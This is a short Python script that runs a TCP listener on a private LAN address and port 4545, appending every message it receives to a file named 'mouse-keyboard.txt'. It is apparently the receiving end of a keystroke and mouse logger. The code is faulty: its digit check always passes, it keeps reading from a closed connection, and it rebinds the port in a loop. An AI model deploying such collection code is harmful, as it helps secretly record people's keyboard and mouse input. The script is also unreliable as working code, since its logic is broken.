import socket
import os
import subprocess
import time



def a():
    while True:       
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('192.168.3.228', 4545))
        print('start server')
        s.listen(3)
        c, addr = s.accept()
        print(addr)
        while True:
            data = c.recv(123456).decode()
            if not data:
                c.close()
            if data[0] == '0' or '1' or '2' or '3' or '4' or '5' or '6' or '7' or '8' or '9':
                open('mouse-keyboard.txt', 'a').write(data)
        c.close()
a()



